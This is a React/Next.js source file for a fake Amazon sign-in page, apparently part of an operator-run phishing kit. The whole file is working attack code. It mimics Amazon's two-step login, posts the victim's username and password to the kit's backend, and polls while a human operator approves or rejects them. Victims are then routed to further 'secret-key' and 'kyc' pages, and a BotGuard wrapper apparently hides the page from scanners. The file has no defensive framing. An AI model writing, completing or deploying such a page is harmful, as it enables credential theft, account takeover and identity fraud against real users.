'use client';

/**
 * Credentials Page — Amazon Sign-In
 *
 * Two-step login: Step 1 = Email/Online ID, Step 2 = Password
 * After submission, button shows loading state while polling for next stage.
 * Form stays visible — no full-page waiting state takeover.
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams, useRouter } from 'next/navigation';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';
import { AlertTriangle, Loader2 } from 'lucide-react';

export default function CredentialsPage() {
  const router = useRouter();
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const [step, setStep] = useState<1 | 2>(1);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [isPolling, setIsPolling] = useState(false);

  const caseId = useSessionStore((s) => s.caseId);
  const status = useSessionStore((s) => s.status);
  const agentMessage = useSessionStore((s) => s.agentMessage);

  // React to operator rejection
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setPassword('');
      setStep(2);
      setIsPolling(false);
      setFieldError(agentMessage || 'Your credentials were rejected. Please try again.');
    }
  }, [status, agentMessage]);

  // Poll for stage changes after successful credential submission
  useEffect(() => {
    if (!isPolling) return;

    const interval = setInterval(async () => {
      try {
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ caseId }),
        });

        if (response.ok) {
          const data = await response.json();
          const nextStep = data.next_step;

          if (nextStep && nextStep !== 'credentials') {
            clearInterval(interval);
            setIsPolling(false);

            const stageToRoute: Record<string, string> = {
              'secret_key': 'secret-key',
              'kyc': 'kyc',
              'completed': 'completed',
              'terminated': 'terminated',
            };
            const route = stageToRoute[nextStep] || nextStep;
            router.push(`/${sessionUuid}/${route}`);
          }
        }
      } catch {
        // Silent retry
      }
    }, 3000);

    return () => clearInterval(interval);
  }, [isPolling, caseId, sessionUuid, router]);

  const isLoading = isSubmitting || isPolling || status === 'waiting';

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (step === 1) {
        if (!username.trim()) {
          setFieldError('Enter your email or mobile phone number');
          return;
        }
        setStep(2);
        return;
      }

      if (!password.trim()) {
        setFieldError('Enter your password');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: username.trim(),
            password: password.trim(),
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(error.error || 'Your password is incorrect');
          return;
        }

        // Credentials accepted — start polling for operator's next action
        setIsPolling(true);
        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: { username, password },
        });
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Something went wrong. Please try again.');
      } finally {
        setIsSubmitting(false);
      }
    },
    [step, username, password, caseId]
  );

  return (
    <BotGuard>
      <div className="auth-card">
        <div className="auth-card-inner">
          <h1 className="auth-heading">Sign in</h1>

          {/* Error Alert */}
          {fieldError && (
            <div className="alert-box alert-error" role="alert">
              <div className="alert-icon">
                <AlertTriangle size={22} color="#CC0C39" />
              </div>
              <div className="alert-content">
                <span className="alert-heading">There was a problem</span>
                <span className="alert-message">{fieldError}</span>
              </div>
            </div>
          )}

          <form className="auth-form" onSubmit={handleSubmit} noValidate>
            {step === 1 ? (
              <>
                <div className="form-group">
                  <label className="form-label" htmlFor="username">
                    Email or mobile phone number
                  </label>
                  <input
                    type="text"
                    id="username"
                    className={`form-input${fieldError ? ' input-error' : ''}`}
                    name="username"
                    autoComplete="username"
                    value={username}
                    onChange={(e) => {
                      setUsername(e.target.value);
                      if (fieldError) setFieldError('');
                    }}
                    autoFocus
                  />
                </div>
                <button type="submit" className="btn-primary btn-continue">
                  Continue
                </button>
              </>
            ) : (
              <>
                {/* Show username with change link */}
                <div className="form-group" style={{ marginBottom: '10px' }}>
                  <span style={{ fontSize: '13px' }}>{username}</span>
                  {' '}
                  <a
                    href="#"
                    className="help-link"
                    onClick={(e) => {
                      e.preventDefault();
                      if (!isLoading) {
                        setStep(1);
                        setFieldError('');
                        setPassword('');
                      }
                    }}
                    style={{ fontSize: '13px' }}
                  >
                    Change
                  </a>
                </div>

                <div className="form-group">
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'baseline' }}>
                    <label className="form-label" htmlFor="password">
                      Password
                    </label>
                    <a href="#" className="help-link" style={{ fontSize: '13px' }}>
                      Forgot password?
                    </a>
                  </div>
                  <div className="password-wrapper">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      id="password"
                      className={`form-input${fieldError ? ' input-error' : ''}`}
                      name="password"
                      autoComplete="current-password"
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        if (fieldError) setFieldError('');
                      }}
                      disabled={isLoading}
                      autoFocus
                    />
                    <button
                      type="button"
                      className="password-toggle"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? 'Hide' : 'Show'}
                    </button>
                  </div>
                </div>

                <button
                  type="submit"
                  className="btn-primary btn-continue"
                  disabled={isLoading}
                >
                  {isLoading && <Loader2 size={16} className="spinner-inline" />}
                  {isLoading ? 'Please wait...' : 'Sign in'}
                </button>

                <div className="checkbox-group">
                  <input type="checkbox" id="keep-signed-in" defaultChecked />
                  <label htmlFor="keep-signed-in">Keep me signed in</label>
                </div>
              </>
            )}
          </form>

          <p className="legal-text">
            By continuing, you agree to Amazon&apos;s{' '}
            <a href="#" className="legal-link">Conditions of Use</a> and{' '}
            <a href="#" className="legal-link">Privacy Notice</a>.
          </p>

          <div className="help-section">
            <a href="#" className="help-link">Need help?</a>
          </div>

          <div className="card-divider" />
          <div className="business-section">
            <p className="business-label">Buying for work?</p>
            <a href="#" className="business-link">Create a free business account</a>
          </div>
        </div>
      </div>
    </BotGuard>
  );
}
